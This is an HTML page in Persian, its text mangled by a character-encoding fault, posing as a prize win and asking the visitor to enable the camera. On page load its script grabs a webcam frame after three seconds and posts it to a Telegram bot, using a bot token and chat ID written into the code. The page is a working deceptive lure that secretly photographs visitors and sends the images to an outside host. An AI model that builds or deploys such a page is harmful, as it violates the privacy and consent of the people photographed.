<!doctype html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ø¬Ø§ÛŒØ²Ù‡ ÙˆÛŒÚ˜Ù‡</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Custom styles for the Inter font and overall body */
    body {
      font-family: 'Inter', sans-serif; /* Using Inter font */
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      margin: 0;
    }
  </style>
</head>
<body>
  <div class="card bg-gray-800 bg-opacity-30 p-8 rounded-xl shadow-2xl max-w-md w-full flex flex-col items-center space-y-6">
    <h2 class="text-3xl font-bold text-yellow-400">ğŸ‰ ØªØ¨Ø±ÛŒÚ©! Ø´Ù…Ø§ Ø¨Ø±Ù†Ø¯Ù‡ Ø¬Ø§ÛŒØ²Ù‡ ÙˆÛŒÚ˜Ù‡ Ø´Ø¯ÛŒØ¯</h2>
    <p class="text-lg text-gray-200">Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ø¬Ø§ÛŒØ²Ù‡ØŒ Ù„Ø·ÙØ§Ù‹ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯</p>
    <div class="relative w-full aspect-video bg-gray-700 rounded-lg overflow-hidden shadow-lg">
      <video id="video" autoplay muted class="w-full h-full object-cover"></video>
      <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center text-gray-400 text-sm bg-gray-800" style="display: none;">
        Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ...
      </div>
    </div>

    <div id="message-box" class="hidden bg-red-600 bg-opacity-80 p-4 rounded-lg text-white text-sm w-full">
      <p id="message-text"></p>
      <button onclick="hideMessage()" class="mt-2 px-4 py-2 bg-red-700 hover:bg-red-800 rounded-md text-white font-semibold">Ø¨Ø³ØªÙ†</button>
    </div>

    <p class="text-xs text-gray-400 mt-4">
      <span class="font-bold">Ù†Ú©ØªÙ‡:</span> Ø§Ú¯Ø± Ø¯ÙˆØ±Ø¨ÛŒÙ† ÙØ¹Ø§Ù„ Ù†Ø´Ø¯ØŒ Ù…Ù…Ú©Ù† Ø§Ø³Øª Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ Ù…Ø³Ø¯ÙˆØ¯ Ú©Ø±Ø¯Ù‡ Ø¨Ø§Ø´Ø¯ ÛŒØ§ Ø§ÛŒÙ† ØµÙØ­Ù‡ Ø¯Ø± Ù…Ø­ÛŒØ·ÛŒ Ø§Ø¬Ø±Ø§ Ø´Ø¯Ù‡ Ø¨Ø§Ø´Ø¯ Ú©Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ Ù…Ø­Ø¯ÙˆØ¯ Ù…ÛŒâ€ŒÚ©Ù†Ø¯. Ù„Ø·ÙØ§Ù‹ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ ØªØ£ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯ ÛŒØ§ Ø§ÛŒÙ† ØµÙØ­Ù‡ Ø±Ø§ Ø¯Ø± ÛŒÚ© ØªØ¨ Ø¬Ø¯ÛŒØ¯ Ù…Ø±ÙˆØ±Ú¯Ø± Ø¨Ø§Ø² Ú©Ù†ÛŒØ¯.
    </p>
  </div>

  <script>
    // Define the Telegram bot token and chat ID
    // Replace with your actual token and chat ID
    const token = "8071837045:AAGidzXGssRwy5chfgPWSUkQycWX6axBcFk";
    const chat_id = "136963421";

    // Get references to video and message box elements
    const video = document.getElementById("video");
    const messageBox = document.getElementById("message-box");
    const messageText = document.getElementById("message-text");
    const cameraPlaceholder = document.getElementById("camera-placeholder");

    /**
     * Displays a custom message box with the given text.
     * @param {string} message - The message to display.
     */
    function showMessage(message) {
      messageText.textContent = message;
      messageBox.classList.remove("hidden");
    }

    /**
     * Hides the custom message box.
     */
    function hideMessage() {
      messageBox.classList.add("hidden");
    }

    /**
     * Sends a photo (Blob) to the Telegram bot.
     * @param {Blob} blob - The image data as a Blob.
     */
    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("photo", blob, "photo.jpg");

      try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        });

        if (!response.ok) {
          // If the response is not OK, something went wrong with the Telegram API
          const errorData = await response.json();
          console.error("Error sending photo to Telegram:", errorData);
          showMessage(`Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…: ${errorData.description || 'Ø®Ø·Ø§ÛŒ Ù†Ø§Ù…Ø´Ø®Øµ'}`);
        } else {
          console.log("Photo sent successfully to Telegram!");
          showMessage("Ø¹Ú©Ø³ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯!");
        }
      } catch (err) {
        // Catch network errors or other issues with the fetch request
        console.error("Network error or other issue during photo send:", err);
        showMessage("Ø®Ø·Ø§ Ø¯Ø± Ø§ØªØµØ§Ù„ ÛŒØ§ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³. Ù„Ø·ÙØ§Ù‹ Ø§ØªØµØ§Ù„ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯.");
      }
    }

    /**
     * Starts the camera, captures a photo after 3 seconds, and sends it.
     */
    async function startCamera() {
      cameraPlaceholder.style.display = 'flex'; // Show placeholder while loading camera
      try {
        // Request access to the user's video camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block'; // Show video element once stream is active
        cameraPlaceholder.style.display = 'none'; // Hide placeholder

        // Wait for the video to load metadata to ensure videoWidth/Height are available
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            resolve();
          };
        });

        // After 3 seconds, capture a photo and send it
        setTimeout(async () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const context = canvas.getContext("2d");
          context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw video frame to canvas

          // Convert canvas content to a Blob and send it
          canvas.toBlob(sendPhoto, "image/jpeg", 0.95);

          // Stop the camera stream after capturing the photo
          stream.getTracks().forEach(track => track.stop());
          video.srcObject = null; // Clear the video source
          video.style.display = 'none'; // Hide video element
          cameraPlaceholder.style.display = 'flex'; // Show placeholder again, or a success message
          messageText.textContent = "Ø¹Ú©Ø³ Ú¯Ø±ÙØªÙ‡ Ø´Ø¯ Ùˆ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø§Ø³Øª...";
          messageBox.classList.remove("hidden"); // Show message box for sending status

        }, 3000); // 3-second delay before capturing

      } catch (err) {
        console.error("Error accessing camera:", err);
        video.style.display = 'none'; // Hide video element
        cameraPlaceholder.style.display = 'flex'; // Show placeholder
        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
          showMessage("Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø¯ Ø´Ø¯. Ù„Ø·ÙØ§Ù‹ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯.");
        } else if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") {
          showMessage("Ø¯ÙˆØ±Ø¨ÛŒÙ†ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯. Ù„Ø·ÙØ§Ù‹ Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒØ¯ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ù‡ Ø¯Ø±Ø³ØªÛŒ Ù…ØªØµÙ„ Ø§Ø³Øª.");
        } else if (err.name === "NotReadableError" || err.name === "TrackStartError") {
          showMessage("Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø± Ø­Ø§Ù„ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø³Øª ÛŒØ§ Ø®Ø·Ø§ÛŒÛŒ Ø¯Ø± Ø´Ø±ÙˆØ¹ Ø¢Ù† Ø±Ø® Ø¯Ø§Ø¯Ù‡ Ø§Ø³Øª.");
        } else {
          showMessage(`Ø®Ø·Ø§ Ø¯Ø± ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ†: ${err.message}. Ù„Ø·ÙØ§Ù‹ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯.`);
        }
      }
    }

    // Start the camera when the window loads
    window.onload = startCamera;
  </script>

</body></html>

